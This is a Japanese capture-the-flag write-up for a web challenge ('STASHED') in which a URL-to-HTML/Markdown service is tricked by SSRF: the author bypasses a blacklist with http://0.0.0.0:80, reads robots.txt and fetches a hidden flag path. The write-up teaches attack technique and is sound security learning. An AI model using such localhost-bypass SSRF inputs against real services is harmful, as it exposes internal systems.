# Challenge Name: STASHED
***

URLを記載するとHTMLを返却するサイト
MarkDownを利用する問題
問題文からrobots.txtを開くらしいので

下記ドメインを入れるとブラックリストに登録されているらしい
> http://ec2-35-159-53-53.eu-central-1.compute.amazonaws.com


SSRFっぽいので下記値でlocalhostを指定してみる  
・localhost  
・127.0.0.1  
・0.0.0.0  

0.0.0.0にした場合は応答が変わった
~~~
https://0.0.0.0/  

cURL Error: Failed to connect to 0.0.0.0 port 443: Connection refused
~~~
~~~
https://0.0.0.0:80

cURL Error: error:1408F10B:SSL routines:ssl3_get_record:wrong version number
~~~

~~~
http://0.0.0.0:80

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">

    <title>WELCOME</title>
  </head>
  <style type="text/css">
    body{
      background: radial-gradient(circle, rgba(42,48,66,1) 10%, rgba(17,25,39,1) 80%);
      color: #9fef00;
    }
    nav{
      background-color: #1a2332 !important;
      color: #9fef00;
    }
    .green{
      color: #9fef00;
      border-color: #9fef00;
      background-color: #1a2332;
    }
  </style>
  <body>
    
<nav class="navbar navbar-dark ">
<a class="navbar-brand">0-0</a>
  <form class="form-inline">
    <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
    <button class="btn green  my-2 my-sm-0" type="submit">Search</button>
  </form>

</nav>
    <div class="container">
       <div class="row">
	</div>
        <div class="row" style="text-align:center;">
            <div class="col-md">
               <form method="post">
                  <center><div class="form-group">
                    <input style="width: 40%;" type="url" class="form-control" id="exampleInputURL1" aria-describedby="urlHelp" placeholder="Enter url" name="url" value="">
                  </div>
                  <button type="submit" class="btn btn-primary">Submit</button>
                  </center>
                </form>
            </div>
        </div>
        <div class="row"></div>
        <div class="row">
            <div class="col-md">
              <div class="form-group">
                <label for="htmltext">HTML</label>:
                <textarea id="htmltext" class="form-control" rows="15"></textarea>
              </div>
            </div>
            <div class="col-md">
              <label for="markdowntext">MD</label>:
              <div class="form-group">
                <textarea id="markdowntext" class="form-control" rows="15"></textarea>
              </div>
        </div>
  </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>

  </body>
</html>
~~~

応答が返ってきたので
下記で指定
http://0.0.0.0:80/robots.txt

![aa](https://github.com/xn16h7/CTF/blob/master/img/writeup5.png)
~~~
User-agent: *
Disallow: super_secret_flag_for_new_year_ctf
~~~
http://0.0.0.0:80/super_secret_flag_for_new_year_ctfでアクセスるとflagを取れた
***
### FLAG{h4ppy_n3w_y34r_2021} 
